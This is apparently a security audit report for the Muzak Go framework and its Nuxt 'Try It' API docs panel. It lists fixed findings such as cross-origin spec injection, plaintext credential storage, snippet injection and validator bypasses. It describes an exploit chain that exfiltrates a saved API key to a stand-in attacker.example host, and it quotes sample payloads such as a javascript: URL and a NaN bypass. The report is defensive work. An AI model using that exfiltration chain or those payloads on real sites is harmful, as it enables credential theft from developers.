# Security Review - muzak

Adversarial ("assume attacker") review of the Muzak Go framework: `framework/`
(the core library) and `panels/openapi/` (the standalone Nuxt "Try It" API docs
UI, currently a work in progress and not yet wired into the framework's own
`/docs` route). Scope covered authentication, middleware, CORS, rate limiting,
client-IP resolution, routing and request dispatch, error handling, logging,
lifecycle management, file uploads, compression, request binding, input
validation, WebSocket, SSE, the built-in OpenAPI docs page, static/frontend
file serving, and the separate Nuxt docs frontend.

Methodology: every subsystem was read in full rather than sampled, cross
checked against its test suite, and verified to still build, vet, lint clean
(`golangci-lint run ./...`) and pass `go test -race ./...` after any fix.
Eight real, exploitable issues were found and fixed. One further issue is
real but not fixed here, with reasoning and a recommended fix given for it.
A handful of lower-severity, already-mitigated, or opt-in-only footguns are
listed for completeness.

---

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | Critical | Cross-origin `?spec=` override in the Nuxt docs UI lets an attacker load a spec they control and silently exfiltrate a saved API credential | Fixed |
| 2 | High | Bearer token / API key / basic-auth password from the "Try It" panel was kept in `localStorage` forever, in plaintext | Fixed |
| 3 | High | Generated code snippets (curl/Python/JS/...) in the "Try It" panel interpolated attacker-influenceable spec data unescaped, so copy-pasting a snippet could run injected shell/script code | Fixed |
| 4 | Medium | `validate.String().URL()` accepted `javascript:`, `data:` and any other scheme as a "valid absolute URL" | Fixed |
| 5 | Medium | `validate.Number()` let NaN and +/-Inf silently satisfy every numeric rule (Min, Max, Between, Positive, Required, ...); a large int64/uint64 also lost precision on every validation pass, not just when a rule changed it | Fixed |
| 6 | Low-Medium | A secret-tagged config field's raw value could leak into a startup error message via a custom `TextUnmarshaler`'s own error text | Fixed |
| 7 | Medium | Rate limiting keyed on the exact client IP lets any client on a rotatable IPv6 /64 (the block size most providers hand out) present a fresh identity on every request | Mitigation added (`IPPrefixTracker`, opt-in) |
| 8 | Medium | WebSocket/SSE concurrent-connection cap was a single global counter with no per-client dimension, so one address could hold the whole process budget | Fixed (`MaxConnectionsPerIP` / `MaxStreamsPerIP`) |
| 9 | Medium | In-memory rate-limit storage's eviction is global, so a high-cardinality custom `Tracker` can be flooded to evict other clients' counters early | Documented, not fixed |

---

## 1. CRITICAL - Cross-origin OpenAPI spec injection -> credential exfiltration (FIXED)

**Where:** `panels/openapi/app/composables/useOpenApiSpec.ts`

The docs UI loads its OpenAPI document from `config.public.specUrl` (default:
same-origin `/openapi.json`), but a `?spec=` query-string parameter could
override that URL to anything, with no origin check:

```ts
const specUrl = computed(() => {
  const fromQuery = route.query.spec
  return typeof fromQuery === 'string' && fromQuery.length > 0
    ? fromQuery
    : config.public.specUrl
})
```

That document is fetched client-side and rendered directly into the page.
Two other parts of the app trust whatever it says without checking where it
came from: `useTryIt.ts` builds the "Try It" request's destination from
`spec.value.servers[server].url`, a field the loaded document fully controls,
and `useAuth.ts`'s `applyAuth()` unconditionally attaches the visitor's saved
credential to whatever URL and headers were built.

**Exploit chain.** A developer has previously used the real docs site
(`https://api.example.com/docs/`) and saved their production API key in the
"Authorize" modal. An attacker sends them
`https://api.example.com/docs/?spec=https://attacker.example/evil-openapi.json`
- the address bar, TLS certificate and origin are all genuine, so nothing
about the link looks suspicious. The browser fetches the attacker's document
(a permissive CORS header on their own response is all that takes), which
declares `servers: [{ "url": "https://attacker.example/collect" }]` and a
plausible-looking operation. When the victim clicks "Try It", their real,
previously-saved token auto-attaches - it is keyed to the docs origin, not to
which spec is loaded - and is sent straight to the attacker's server. No
credential re-entry is needed. This is also a documentation-spoofing primitive
in its own right: the real domain can be made to display entirely fabricated
endpoints or instructions.

**Fix applied.** `?spec=` is now honored only when it resolves, relative or
absolute, to the page's own origin; anything cross-origin falls back to the
configured default:

```ts
const pageOrigin = useRequestURL().origin
const specUrl = computed(() => {
  const fromQuery = route.query.spec
  return typeof fromQuery === 'string' && fromQuery.length > 0 && isSameOrigin(fromQuery, pageOrigin)
    ? fromQuery
    : config.public.specUrl
})

function isSameOrigin(value: string, pageOrigin: string): boolean {
  try {
    return new URL(value, pageOrigin).origin === pageOrigin
  } catch {
    return false
  }
}
```

`URL(value, pageOrigin)` also rejects a protocol-relative override
(`//attacker.example/...`), since its resolved origin will not match.

Note that the framework's own built-in documentation page (`framework/docs.go`
+ `docs.html`) never had this problem: it serves under a strict
Content-Security-Policy with `connect-src 'self'`, which blocks cross-origin
fetches outright regardless of any query parameter. The vulnerability was
specific to the separately-deployed Nuxt docs application.

---

## 2. HIGH - API credentials persisted forever in plaintext localStorage (FIXED)

**Where:** `panels/openapi/app/composables/usePersisted.ts`,
`useDocsState.ts`, `components/AuthModal.vue`

The "Try It" panel's Authorize modal saves whatever the visitor pastes in -
bearer token, API key, or a basic-auth username and password - through
`usePersisted()`, which mirrored the value into `localStorage` unconditionally.
Unlike `sessionStorage`, `localStorage` has no expiry and survives the browser
being closed and reopened days or weeks later. The modal's own disclosure text
even named the mechanism ("Stored in this browser only (`localStorage`)..."),
so this was a deliberate but underspecified tradeoff rather than an oversight.

The practical risk: any XSS anywhere on the docs origin (including, before
finding 3 below was fixed, the injected-snippet path) can read the credential
back out with a single `localStorage.getItem(...)` call, and so can anyone
with later access to the browser profile or disk on a shared or lent machine,
indefinitely.

**Fix applied.** `usePersisted()` now takes an optional storage backend
(defaulting to `localStorage` for ordinary UI state), and the `auth` field
specifically is backed by `sessionStorage` instead:

```ts
export function usePersisted<T>(key: string, fallback: T, backend: () => Storage = () => localStorage) { ... }

auth: usePersisted<AuthState>('auth', { schemeId: '', token: '', apiKeyName: '', user: '', pass: '' }, () => sessionStorage),
```

This keeps the credential available across a page reload within the same tab
- the convenience the feature exists for - while ensuring it is gone the
moment the tab or browser closes, rather than sitting on disk indefinitely.
The modal's disclosure text was updated to describe the new behavior
accurately.

---

## 3. HIGH - Code-snippet injection in the "Try It" panel's copy-paste examples (FIXED)

**Where:** `panels/openapi/app/utils/codegen.ts`

The panel generates ready-to-paste curl/Python/JavaScript/TypeScript/Go
snippets from the currently loaded operation: its URL, method, headers and
body. Every generator built its snippet by interpolating those values directly
into a string literal with no escaping, e.g. the curl generator:

```ts
const lines = [`curl -X ${r.method} "${r.url}"`]
for (const [k, v] of Object.entries(r.headers)) lines.push(`  -H "${k}: ${v}"`)
if (r.body) lines.push(`  -d '${r.body.replace(/\n\s*/g, ' ')}'`)
```

All of `r.url`, `r.method` and the header names/values are sourced from the
loaded OpenAPI document (its `servers[].url`, parameter names, and security
scheme names) or from a live HTTP response - none of it text this app wrote.
Combined with finding 1 (before it was fixed, a `?spec=` override could point
the page at an attacker-controlled document), an attacker-chosen operation
name or server URL containing a stray `"` or `'` could break out of the
intended string or shell-quoted token in the generated snippet. A developer
who trusts the real docs domain and copy-pastes the "curl example" into their
terminal could end up running injected shell commands; the JS/Python/Go
variants have the equivalent risk for their own syntax.

**Fix applied.** Every generator now quotes through a helper matched to its
target language instead of raw template interpolation: `strLit()`
(`JSON.stringify`, correct for JS/TS/Go/C#/Java/Rust's string escaping),
`shQuote()` (POSIX single-quote escaping, `'` becomes `'\''`, for the curl/
shell snippet), and `singleQuote()` (PHP/Ruby's own single-quote escaping
rules). No user- or spec-derived value reaches a generated snippet
unescaped any more.

This closes the injection path independently of finding 1: even a same-origin
spec with an attacker-influenced field (an operation summary a developer
copy-pasted from an untrusted source into their own spec, for instance) can no
longer break out of a generated snippet.

---

## 4. MEDIUM - `validate.String().URL()` accepted `javascript:`, `data:` and `file:` (FIXED)

**Where:** `framework/validate/string.go`

The URL rule checked only that a value parsed with a scheme and a host:

```go
parsed, err := url.Parse(*value)
if err != nil || parsed.Scheme == "" || parsed.Host == "" {
    return errors.New("must be a valid absolute URL")
}
```

`url.Parse` happily accepts `javascript://x/%0aalert(1)`, `data://text/html,...`
and similar as absolute URLs with a non-empty scheme and host. Any application
using `.URL()` to validate a field it later uses in a redirect, a stored
profile link, an `<a href>`, or a server-side fetch would have that validation
pass for a payload that is not a fetchable web address at all - the exact kind
of input an XSS-via-redirect or open-redirect exploit needs, now bearing the
validator's blessing.

**Fix applied.** The rule now also requires an http or https scheme:

```go
parsed, err := url.Parse(*value)
if err != nil || parsed.Host == "" || !isHTTPScheme(parsed.Scheme) {
    return errors.New("must be a valid absolute http or https URL")
}
```

Tests were extended to cover `javascript://` and `data://` payloads
explicitly, alongside the existing no-host/relative/garbage cases.

---

## 5. MEDIUM - NaN/Infinity bypassed every numeric rule; silent precision loss on large integers (FIXED)

**Where:** `framework/validate/number.go`

Two related bugs in the same `Evaluate` method:

- `strconv.ParseFloat` accepts the literal strings `"NaN"` and `"Inf"` out of a
  path, query, header or form value. Every comparison against NaN is false, so
  a field validated with `Min`, `Max`, `Between`, `Positive`, `Negative` or
  `MultipleOf` treated a NaN input as satisfying all of them simultaneously;
  `Required`'s zero-check (`value == 0`) is also false for NaN, so even a
  required numeric field accepted it as present. A client could send
  `?age=NaN` to a field validated with `Between(18, 120)` and pass.
- The bound value was converted through `float64` and written back on every
  call, not only when a rule actually transformed it (`Clamp` is the only
  transform). Converting an `int64` or `uint64` through `float64` loses
  precision above 2^53; writing that lossy round-trip back into the field even
  when nothing needed to change silently corrupted large IDs and similar
  fields on every request that touched them.

**Fix applied.** NaN and both infinities are rejected up front, before any
rule runs, with a clear message ("must be a finite number"). The value is now
written back only when a transform actually changed it, confining the
unavoidable float64 rounding to the one rule (`Clamp`) that needs it instead
of applying it unconditionally to every numeric field on every request.

---

## 6. LOW-MEDIUM - A secret config field's parse error could echo its raw value (FIXED)

**Where:** `framework/config.go`

When a config value failed to parse, the loader appended the offending raw
text to its error unless the field was tagged secret, in which case the value
was withheld - but this redaction only covered the text `describeBadValue`
itself appended. If the field's type implements `encoding.TextUnmarshaler`
(the mechanism a custom credential type uses), that type's own `UnmarshalText`
error message is free to include the raw value it was given (e.g. `fmt.Errorf("invalid key %q", raw)`
is a completely natural thing for such a type to write), and that error reached
the final message verbatim via `%w` regardless of the secret tag.

**Fix applied.** A secret-tagged field's parse failure is now reported with a
single fixed message ("could not be parsed (value hidden because the field is
marked secret)") before the underlying error is ever formatted into anything,
so a custom type's own error text can no longer carry a credential into a
startup log or crash report.

---

## 7. MEDIUM - Rate limiting by exact IP is bypassable on IPv6 (mitigation added)

**Where:** `framework/ratelimit.go`, `framework/clientip.go`

The default `IPTracker` keys a quota on the client's exact resolved address.
That is the correct, spoof-resistant identity for IPv4, where an address is a
scarce resource. It is a much weaker identity for IPv6: a /64 is the block
size most residential and cloud providers hand a single customer, so a client
holding one can present a different address from that same block on every
request while never leaving space only they control - and each new address is
a completely fresh budget to `IPTracker`, defeating the point of the limiter
for that class of client.

**What was added, and why not a default change.** `IPPrefixTracker(ipv4Bits,
ipv6Bits int)` was added as an explicit, opt-in `Tracker`: it keys on a
configurable prefix of the address rather than the whole of it (e.g. `/32` for
IPv4, collapsing IPv6 addresses to their real `/64` allocation), so every
address in that range shares one budget:

```go
muzak.RateLimitOptions{Tracker: muzak.IPPrefixTracker(32, 64)}
```

This is offered as a tool rather than wired in as the new default, because the
right prefix length is a deployment decision (a `/64` is the common allocation
but not universal, and an application sitting behind its own NAT or VPN
concentrator has a different picture of what "one client" means), and changing
the default tracker's semantics would be a silent behavior change for every
existing deployment. Applications serving IPv6 clients and relying on
per-client rate limiting should adopt `IPPrefixTracker` explicitly.

---

## 8. MEDIUM - WebSocket/SSE connection cap had no per-client dimension (FIXED)

**Where:** `framework/registry.go` (`liveRegistry`), `framework/websocket_route.go`
(`WSOptions`, `acceptWebSocket`), `framework/sse_route.go` (`SSEOptions`,
`acceptSSE`).

The concurrent-connection cap was a single process-wide counter with no
per-client dimension. A WebSocket/SSE handshake needs no `Origin` header at
all to be accepted (correctly so - only a browser sends one, and the origin
check exists to stop browser-based hijacking, not to authenticate a client),
so a single unauthenticated non-browser client could open and hold all 1024
slots, returning 503 to every other client application-wide until it
disconnected.

**Fix applied.** `liveRegistry[T]` gained an optional per-key dimension
alongside its existing process-wide `limit`: a `perKeyLimit`, a map from each
live entry back to the key it was admitted under, and a per-key live count.
`admits`/`add` now take a key and return a new `registryKeyFull` outcome,
distinct from the existing `registryFull`, when that specific key - not the
process as a whole - is already holding as many entries as it may; `remove`
decrements the right key's count symmetrically. The dimension costs nothing
when unused: a key of `""` (what a caller passes when no per-key limit is
configured at all) is never recorded or checked.

Two new options wire this in, following the exact shape and constraints
`MaxConnections`/`MaxStreams` already established: `WSOptions.MaxConnectionsPerIP`
and `SSEOptions.MaxStreamsPerIP`, each defaulting to 64
(`DefaultWSMaxConnectionsPerIP`/`DefaultSSEMaxStreamsPerIP`), a negative value
disabling the check, and - like their process-wide counterparts - refused at
build time if set anywhere other than the application, since the resource
they bound is a client's share of the whole process rather than of one route.
The key is the address `Context.ClientIP()` resolves, the same
spoof-resistant resolution the rate limiter's `IPTracker` already uses, so it
inherits whatever `ClientIPOptions` (trusted proxies) the application has
configured; if the address cannot be resolved while the limit is on, the
handshake/request is refused with a clear, server-side-logged error rather
than being counted anonymously against a shared budget.

64 was chosen as a default because it is far above what a legitimate browser
session needs (dozens of tabs each open to their own connection stay well
under it) and far below the process-wide default of 1024, so a single
misbehaving or attacking address can now take a meaningful slice of the
budget but never all of it; 16 independently-capped addresses would still be
needed to exhaust the default process-wide limit together, turning a
single-source denial of service into something that needs distributed
resources to reproduce.

Verified with new tests covering: the 503-plus-`Retry-After` behavior once
one address's own limit is reached while the process-wide limit still has
room, that a different address is unaffected, the build-time
application-only restriction (including via a router), the negative-disables
resolution helper, and a registry-level unit test isolating the admit/refuse/
remove/re-admit bookkeeping directly. The whole suite, including
`-race`, and `golangci-lint run ./...` were clean afterward.

---

## 9. MEDIUM - Rate-limiter eviction is global, so a high-cardinality custom Tracker can be flooded (not fixed)

**Where:** `framework/ratelimit_memory.go`, `makeRoom` (around line 211).

The in-memory rate-limit storage is correctly bounded (`MaxEntries`, default
100,000) and, once full, evicts the single globally soonest-to-expire counter
(a min-heap keyed by expiry, with no partitioning by quota or tenant). This is
safe when keyed by the default, spoof-resistant `ClientIP()`. It is not safe if
an application supplies its own `Tracker` keyed on something higher
cardinality and attacker-influenced - the framework's own documentation gives
`"tenant:" + ctx.Header("X-Tenant")` as an example pattern for exactly this
kind of custom tracker. An attacker sending around 100,000 requests each with
a distinct header value gets a fresh, un-throttled counter on every one of
them (a full self-bypass), and once the table saturates, every further attempt
evicts the globally soonest-to-expire entry - which is disproportionately
likely to belong to some other legitimate tenant or IP, silently resetting
their limit early.

**Why not fixed here.** The default `IPTracker` is not affected, so nothing
unsafe ships by default; only an application-supplied high-cardinality
`Tracker` triggers this. A "smarter" eviction policy (weighting by quota,
partitioning the table per quota name) changes rate-limiter semantics broadly
enough to deserve its own tests rather than a same-session change to shared
eviction code.

**Recommendation.** Document (README/godoc) that a custom `Tracker` should key
on authenticated, low-cardinality identity wherever possible, and consider
partitioning the expiry heap per quota name so that one quota's flood cannot
evict another quota's counters.

---

## 10. Low / informational

Real observations, but each is either already mitigated, an opt-in-only
footgun requiring an application author to choose the unsafe path, or has no
exploit path today. Listed for completeness.

| # | Finding | Where | Why it is low risk today |
|---|---|---|---|
| 10.1 | Log redaction (`DefaultRedactedKeys`) matches by attribute key only; logging a whole struct or map via `slog.Any("req", obj)` bypasses it, since nested fields never surface as their own key. | `framework/logging.go` | Requires application code to log a raw object containing secrets; framework-level redaction cannot see inside arbitrary application types. |
| 10.2 | Panic values and wrapped error causes are logged verbatim server-side; never sent to the client, since the HTTP response is always the fixed opaque envelope. | `middleware.go` (`Recovery`), `errors.go` (`logCause`) | By design, for debuggability. Only a problem if application code panics or wraps an error with a literal secret in the message text. |
| 10.3 | `muzak.HTML` is written unescaped by design (the same contract as `html/template.HTML`), with no adjacent "safe compose" helper alongside it. | `framework/html.go` | Documented escape hatch; only becomes XSS if a handler interpolates client input into it directly, which the doc comment explicitly warns against. |
| 10.4 | `upload.File.Filename` is raw, client-supplied text with no sanitizing helper offered; `File.Save(path)` writes to whatever path it is given. | `framework/upload.go` | The framework itself never uses `Filename` to build a path, so there is no exploitable path inside the framework, and the doc comment explicitly warns against building one from it. An application doing `file.Save(filepath.Join(dir, file.Filename))` would be vulnerable to `../` traversal; a `SaveAs(dir)`-style helper that generates its own filename would remove the temptation. |
| 10.5 | Response compression is a BREACH-style compression oracle when a route both reflects attacker input and includes a secret in the same compressed response. | `framework/compress.go` | Already documented in-code with the exact mechanism and mitigation advice; inherent to any generic HTTP compression middleware, not fixable generically at this layer. |
| 10.6 | `X-Forwarded-For` trust is all-or-nothing once a peer is listed in `TrustedProxies`: an overly broad CIDR entry (covering address space an attacker can reach directly, not only the real proxy) lets that attacker spoof arbitrary addresses. | `framework/clientip.go` | Not a code bug - opt-in, explicit, scoped trust is required by design, and the zero value trusts nothing. Purely an operator-configuration risk. |
| 10.7 | Setting `RateLimitOptions` storage's `MaxEntries` negative (an explicit, documented opt-out) combined with a high-cardinality tracker reintroduces unbounded memory growth for up to one sweep interval. | `framework/ratelimit_memory.go` | Already labeled unsafe in the doc comment; requires deliberately disabling the bound. |
| 10.8 | No built-in CSRF protection for cookie-authenticated routes. | `framework/middleware.go` (CORS), whole framework | Correct scope: CORS and CSRF are different problems, and Muzak's CORS is deny-by-default. Worth a line in the README for anyone doing cookie-based auth: add CSRF tokens or `SameSite` cookies yourself, since nothing here does it for you. |

---

## 11. What was checked and found solid

Called out because it is directly relevant to how much to trust the rest of
the codebase, and because it names the patterns worth replicating elsewhere.

- **Timing-safe secret comparisons everywhere.** `auth.go`'s `SecureCompare`
  hashes both operands with SHA-256 before `subtle.ConstantTimeCompare`,
  avoiding both a timing leak and a length leak; used consistently by
  `RequireBearerToken`/`RequireHeaderToken`. No `==` comparison of a secret
  exists anywhere in the framework.
- **Only `crypto/rand`, everywhere it matters.** WebSocket frame masking keys,
  CSP nonces, and the docs page's per-response nonce all use `crypto/rand`.
  No use of `math/rand` for anything security-sensitive.
- **CORS is deny-by-default and cannot be misconfigured into wildcard plus
  credentials** - that combination is rejected at application-build time
  (`ErrCORSWildcardCredentials`), and an Origin is only ever reflected after an
  exact allowlist match or a caller-supplied function, never blindly.
- **Client-IP resolution is spoof-resistant by default**: the zero value
  trusts nothing; a forwarding header is only consulted once its immediate
  peer is an explicitly configured trusted proxy, the walk is right-to-left
  (cannot be lied to past a genuine hop), and hop count is capped to prevent
  parsing amplification.
- **Cross-site WebSocket hijacking is properly prevented**: origin checking is
  a default-deny allowlist enforced before the connection is hijacked, with
  same-origin always allowed and an explicit, clearly-documented opt-out for
  the one case (token-only auth) where it is safe to skip.
- **Static and frontend file serving is traversal-safe**: `os.OpenRoot` plus
  `fs.ValidPath` keep a symlink or a `../` segment from ever escaping the
  served directory, and a directory itself is never listed.
- **No SQL, no `os/exec`, no `text/template` anywhere in the framework** -
  there is no injection surface of those classes to find. The one `sha1` use
  (`websocket_route.go`) is the RFC 6455-mandated handshake accept-key
  computation, not a security-sensitive hash choice.
- **DoS defaults are sane**: read/write/idle/header timeouts and
  request/upload/file size caps all default to sane non-zero values, with an
  explicit comment on every one naming the slow-loris-style attack it exists
  to stop.
- **WebSocket/SSE per-message handling resists memory exhaustion**: a frame's
  declared length is never trusted for a single allocation - payloads are read
  and grown in bounded chunks - and a message's true size is checked against
  the connection's read limit as it arrives, not after the fact.
- **Panics never reach the client.** Both the HTTP and WebSocket/SSE recovery
  paths log the panic value and stack server-side only and always respond with
  the fixed, opaque error envelope.
- **Rate limiter internals are race-free**: check-then-increment is fully
  mutex-serialized, and the in-memory table is bounded with eviction rather
  than growing without limit (see finding 9 for the one caveat, which needs an
  application-supplied unsafe tracker to matter).
- **No JWT implementation** exists (only static shared-secret bearer/header
  guards), so the usual algorithm-confusion or missing-expiry JWT bug classes
  do not apply here.
- **No mass-assignment risk**: reflection-based request binding only ever
  touches exported fields, and JSON body decoding is structurally prevented
  from overwriting a field bound from the path, query or a header, even for an
  embedded struct that mixes both kinds of field.
- **Go's `regexp` package is RE2-based**, so even a `Matches()` rule built
  from a pattern the application author chose poorly cannot suffer
  catastrophic backtracking; ReDoS is not a reachable bug class here.
- **The Nuxt docs frontend's own syntax highlighters HTML-escape before
  wrapping in markup** (both `hi()` and Shiki's `codeToHtml`), so its `v-html`
  usages for request/response bodies and code samples do not introduce XSS on
  their own, and the one place a spec-derived path is rendered as markup
  (`prettyPath`) escapes it first as well.

---

## One caveat about this review's process

Part of this audit was carried out by several parallel review agents, one per
subsystem. All of their concrete findings and fixes were independently
re-verified by hand against the actual source before being written up here
(and the whole framework module was rebuilt, vetted and re-tested afterward),
so nothing above is taken on faith from an agent's own summary. Readers of
this file do not need to know that to trust it; it is noted only for
transparency about how the review was conducted.
